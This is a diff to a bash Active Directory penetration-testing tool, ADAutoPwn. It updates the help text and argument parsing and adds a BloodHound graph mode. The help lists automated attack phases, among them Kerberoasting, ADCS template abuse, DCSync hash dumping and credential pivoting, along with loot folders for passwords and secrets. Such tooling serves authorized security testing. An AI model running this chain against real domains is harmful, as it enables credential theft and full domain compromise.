     echo -e "${C_GREY}    ════════════════════════════════════════════════════════════${C_RESET}"
     echo -e "${C_GREY}     Thanks for using ADAutoPwn · by ${C_RESET}${C_GREEN}${C_BOLD}${AUTHOR}${C_RESET}"
@@ -1767,9 +2663,16 @@ ${C_CYAN}${C_BOLD}OPTIONS${C_RESET}
   ${C_GREEN}--stealth${C_RESET}      OPSEC mode: skip noisy techniques (enum4linux, etc.) + add jitter
   ${C_GREEN}--ntlm${C_RESET}         Force NTLM auth ${C_DIM}(default is Kerberos-first)${C_RESET}
   ${C_GREEN}--no-bh${C_RESET}        Skip BloodHound collection
+  ${C_GREEN}--no-open${C_RESET}      Don't auto-open graph.html in a browser
   ${C_GREEN}-y, --yes${C_RESET}      Assume "yes" to all prompts — fully unattended run
   ${C_GREEN}--no-color${C_RESET}     Disable colored output (also honored via NO_COLOR=1)
   ${C_GREEN}-h, --help${C_RESET}     Show this help
+
+${C_CYAN}${C_BOLD}STANDALONE GRAPH${C_RESET} ${C_DIM}(no scan — just visualize a BloodHound zip)${C_RESET}
+  ${C_GREEN}--graph${C_RESET} <zip>   Render any BloodHound .zip into the interactive ${C_BOLD}graph.html${C_RESET}
+                and open it. Domain auto-detected from the data
+  ${C_GREEN}--owned${C_RESET} <file>  Mark these principals (one per line) as compromised in the graph
+  ${C_DIM}e.g.  $0 --graph ~/Downloads/bloodhound.zip${C_RESET}
 
 ${C_CYAN}${C_BOLD}WHAT IT DOES${C_RESET} ${C_DIM}(phases run automatically, gated by what your access unlocks)${C_RESET}
   ${C_PURPLE}0${C_RESET}  Discovery      nmap of AD ports, SMB fingerprint → hostname/domain/FQDN
@@ -1785,9 +2688,10 @@ ${C_CYAN}${C_BOLD}WHAT IT DOES${C_RESET} ${C_DIM}(phases run automatically, gate
   ${C_PURPLE}+${C_RESET}  Trusts         domain/forest trusts, foreign principals, cross-forest roast
   ${C_PURPLE}6${C_RESET}  Kerberoast     GetUserSPNs for SPN accounts (+ cross-forest)
   ${C_PURPLE}7${C_RESET}  ADCS           certipy scan for ESC1..ESC16 vulnerable templates
-  ${C_PURPLE}8${C_RESET}  BloodHound     full collection (All) → importable .zip
+  ${C_PURPLE}8${C_RESET}  BloodHound     full collection (All) → importable .zip ${C_BOLD}+ interactive graph.html${C_RESET}
   ${C_PURPLE}9${C_RESET}  DCSync         secretsdump -just-dc when privileges allow → all NTLM hashes
-  ${C_PURPLE}∞${C_RESET}  Pivot loop     every new identity (cracked / reset / LAPS / gMSA) is
+  ${C_PURPLE}+${C_RESET}  Report         consolidated ${C_BOLD}report.md${C_RESET} + tidy loot (enum/ · secrets/ · raw/)
+  ${C_PURPLE}∞${C_RESET}  Pivot loop     every new identity (cracked / reset / LAPS / gMSA / ESC1) is
                     re-fed and the whole chain repeats until nothing new appears
 
 ${C_CYAN}${C_BOLD}EXAMPLES${C_RESET}
@@ -1809,11 +2713,17 @@ ${C_CYAN}${C_BOLD}EXAMPLES${C_RESET}
   ${C_DIM}# Clean up after yourself (revert group adds, etc.)${C_RESET}
   $0 -t 10.10.10.10 --cleanup -o loot_corp.local_20260607_2210
 
-${C_CYAN}${C_BOLD}LOOT LAYOUT${C_RESET} ${C_DIM}(everything is also printed live)${C_RESET}
-  loot_<dom>_<date>/  adautopwn.log · nmap_dc.txt · users_all.txt · asrep_hashes.txt
-                      kerberoast_hashes.txt · secretsdump.txt · laps.txt · gmsa.txt
-                      acl_writable_<user>.txt · trusts.txt · certipy_find.txt
-                      bloodhound/*.zip · cracked_passwords.txt · rollback.log
+${C_CYAN}${C_BOLD}LOOT LAYOUT${C_RESET} ${C_DIM}(tidied at the end — trophies on top, the rest grouped)${C_RESET}
+  loot_<dom>_<date>/
+   ├─ ${C_BOLD}report.md${C_RESET}        consolidated, human-readable engagement report
+   ├─ ${C_BOLD}graph.html${C_RESET}       interactive offline attack graph (auto-opens)
+   ├─ users_all.txt · found_passwords.txt · credential_map.txt · *.ccache
+   ├─ asrep_hashes.txt · kerberoast_hashes.txt · secretsdump.txt · rollback.log
+   ├─ enum/           users/groups/policy, nmap, domain wordlist
+   ├─ secrets/        LAPS · gMSA · GPP · DPAPI · ACL dumps · trusts · ADCS · coercion
+   ├─ shares/         looted share contents
+   ├─ bloodhound/     collection .zip
+   └─ raw/            misc intermediates
 
 ${C_YELLOW}${C_BOLD}⚠  LEGAL:${C_RESET} ${C_YELLOW}Use only against systems you are explicitly authorized to test
    (signed engagement, your own lab, or a CTF you're entitled to play).${C_RESET}
@@ -1842,6 +2752,9 @@ parse_args() {
             --no-crack) DO_CRACK=0; shift;;
             --abuse) DO_ABUSE=1; shift;;
             --cleanup) DO_CLEANUP=1; shift;;
+            --graph) GRAPH_ZIP="$2"; shift 2;;
+            --owned) OWNED_FILE="$2"; shift 2;;
+            --no-open) NO_OPEN=1; shift;;
             --stealth) STEALTH=1; shift;;
             --ntlm) KERBEROS=0; shift;;
             --no-bh) DO_BLOODHOUND=0; shift;;
@@ -1851,7 +2764,7 @@ parse_args() {
             *) err "Unknown option: $1"; usage; exit 1;;
         esac
     done
-    [[ -z "$DC_IP" ]] && { err "Missing -t <DC_IP>"; exit 1; }
+    [[ -z "$DC_IP" && -z "$GRAPH_ZIP" ]] && { err "Missing -t <DC_IP>  (or --graph <bloodhound.zip>)"; exit 1; }
 }
 
 # ===========================================================================
@@ -1862,6 +2775,19 @@ main() {
     clear 2>/dev/null
     banner
 
+    # Standalone graph mode: render a BloodHound zip → graph.html and exit
+    if [[ -n "$GRAPH_ZIP" ]]; then
+        [[ -n "$OUTDIR" ]] && { mkdir -p "$OUTDIR"; OUTDIR="$(cd "$OUTDIR" && pwd)"; }
+        graph_only_mode
+        exit 0
+    fi
+
+    # If launched from *inside* an existing loot dir (it has our log), reuse it
+    # instead of nesting loot_/loot_. This makes a plain re-run resume cleanly.
+    if [[ -z "$OUTDIR" && -f "./adautopwn.log" && "$(basename "$PWD")" == loot_* ]]; then
+        OUTDIR="$PWD"
+        warn "Detected an existing loot dir in CWD → reusing it (resume) instead of nesting"
+    fi
     [[ -z "$OUTDIR" ]] && OUTDIR="loot_${DOMAIN:-$DC_IP}_$(date +%Y%m%d_%H%M%S)"
     mkdir -p "$OUTDIR"; OUTDIR="$(cd "$OUTDIR" && pwd)"
     LOGFILE="$OUTDIR/adautopwn.log"; : >"$LOGFILE"
